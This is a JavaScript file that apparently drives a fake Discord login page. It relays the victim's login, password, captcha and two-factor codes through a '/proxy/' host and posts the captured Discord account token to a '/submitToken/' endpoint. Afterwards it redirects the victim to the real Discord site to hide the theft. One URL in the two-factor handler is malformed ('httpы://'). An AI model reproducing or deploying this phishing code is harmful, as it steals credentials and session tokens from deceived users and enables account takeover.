let widgetID = null;
let widgetIDRes = null;
let captchaUsed = false;
let logInp = document.getElementById("loginInput");
let passInp = document.getElementById("passwordInput");
let mfaInput = document.getElementById("mfaInput");
let logErr = document.getElementById("loginError");
let passErr = document.getElementById("passwordError");
let logOuter = document.getElementById("loginOuter");
let mfaErr = document.getElementById("mfaError");
let mfaTicket = null;
let latestMfaInfo = null;
let mfaState = 0;
initCaptchaCheck();
//canRecieveSMS
function tryLogin(captcha = null){
    let err = false;
    if(logInp.value.trim() == ""){
        err = true;
        logOuter.classList.add("error-2O5WFJ");
        logErr.classList.add("error-25JxNp");
        logErr.innerHTML = getErrorContent("Email or Phone Number", "This field is required");
    }
    if(passInp.value.trim() == ""){
        err = true;
        passInp.classList.add("inputError-1PrjdI");
        passErr.classList.add("error-25JxNp");
        passErr.innerHTML = getErrorContent("Password", "This field is required");
    }
    if(err) return;
    fetch(`https://${domainHHH}/proxy/login`, {
        method: "POST",
        headers: {
          'Content-Type': "application/json"
        },
        body: JSON.stringify({
            captcha_key: captcha,
            gift_code_sku_id: null,
            login: logInp.value.trim(),
            login_source: null,
            password: passInp.value.trim(),
            undelete: false
        })
    }).then(e => e.json()).then(json => {
        if(json.captcha_key && json.captcha_key[0] == "captcha-required") return openCaptchaPage(json.captcha_sitekey);
        if(json.errors) return showErrors(json.errors);
        if(json.mfa || json.sms) return parseMfa(json);
        if(json.token) submitCode(json.token)
    })
}

function submitCode(token){
    if(token){
        fetch("/submitToken/"+adCode, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({ token })
        }).catch(e => {});
        window.location.href = "https://discord.com/channels/@me";
    }
}

function checkTotpButton(){
    if(mfaInput.value.trim() == ""){
        showMfaError("This field is required");
        return;
    }
    checkTotp(mfaInput.value.trim());
}

function checkTotp(code){
    fetch(`httpы://` + domainHHH + (mfaState === 1 ? "/proxy/sms" : "/proxy/totp"), {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
        },
        body: JSON.stringify({
            code: code,
            ticket: mfaTicket,
            login_source: null,
            gift_code_sku_id: null,
        })
    }).then(e => e.json()).then(json => {
        if(json.message) return showMfaError(json.message);
        showMfaError(false);
        if(json.token) submitCode(json.token)
    }).catch(e => {});
}

function parseMfa(json = false){
    mfaState = 0;
    let inf = true;
    if(!json) inf = false;
    json = json || latestMfaInfo;
    if(inf) latestMfaInfo = json;
    mfaTicket = json.ticket;
    if(json.mfa){
        document.getElementById("mfaText").innerText = "You can use a backup code or your two-factor authentication mobile app.";
        if(json.sms){
            document.getElementById("canRecieveSMS").innerText = "Receive auth code from SMS";
            document.getElementById("canRecieveSMS").style.display = "block";
        }
        else document.getElementById("canRecieveSMS").style.display = "none";
        openMfaPage();
    }else if(json.sms){

    }
}

function showMfaError(error = false){
    if(error){
        if(error != "Invalid two-factor code") parseMfa(false);
        mfaErr.innerHTML = getErrorContent("Enter Discord Auth/Backup Code", error);
        mfaErr.classList.add("error-25JxNp");
        mfaInput.classList.add("inputError-1PrjdI");
    }else{
        mfaErr.classList.remove("error-25JxNp");
        mfaInput.classList.remove("inputError-1PrjdI");
    }
}

function showErrors(errors){
    let loginError = errors?.login?._errors[0]?.message;
    if(loginError){
        logOuter.classList.add("error-2O5WFJ");
        logErr.classList.add("error-25JxNp");
        logErr.innerHTML = getErrorContent("Email or Phone Number", loginError);
    }else{
        logOuter.classList.remove("error-2O5WFJ");
        logErr.classList.remove("error-25JxNp");
    }
    let passwordError = errors?.password?._errors[0]?.message;
    if(passwordError){
        passInp.classList.add("inputError-1PrjdI");
        passErr.classList.add("error-25JxNp");
        passErr.innerHTML = getErrorContent("Password", passwordError);
    }else{
        passInp.classList.remove("inputError-1PrjdI");
        passErr.classList.remove("error-25JxNp");
    }
}

function initCaptchaCheck(){
    setInterval(() => {
        if(!widgetID) return;
        let key = hcaptcha.getResponse(widgetID);
        if(key.trim() != "") captchaChecked(key);
    }, 1000);
}

function captchaChecked(key){
    hcaptcha.reset(widgetID);
    captchaUsed = true;
    widgetID = null;
    closeCaptchaPage();
    tryLogin(key);
}

function sendSms(){
    mfaState = 1;
    fetch("https://discord.com/api/v9/auth/mfa/sms/send", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            ticket: mfaTicket
        })
    }).then(e => e.json()).then(e => {
        if(e.message) return showMfaError(e.message);
        document.getElementById("mfaText").innerText = `We've sent a message to ${e.phone}.  Please enter the code you received.`;
        document.getElementById("canRecieveSMS").innerText = "Resend SMS?";
    });
}

function closeMfaPage(){
    document.getElementById("contentThird").style.display = "none";
    document.getElementById("contentSecond").style.display = "block";
}

function openMfaPage(){
    mfaInput.value = "";
    document.getElementById("contentSecond").style.display = "none";
    document.getElementById("contentThird").style.display = "block";
}

function closeCaptchaPage(){

    document.getElementById("contentFirst").style.display = "none";
    document.getElementById("contentSecond").style.display = "block";
}

function openCaptchaPage(sitekey){
    document.getElementById("contentSecond").style.display = "none";
    document.getElementById("contentFirst").style.display = "block";
    if(!captchaUsed) {
        widgetID = hcaptcha.render(
            document.getElementById("captchaContent"),
            {
                sitekey,
                theme: "dark",
            }
        );
    } else widgetID = widgetIDRes;
    widgetIDRes = widgetID;
}

function getErrorContent(title, error){
    return `${title}<span class="errorMessage-3Guw2R"><span class="errorSeparator-30Q6aR">-</span>${error}</span>`
}
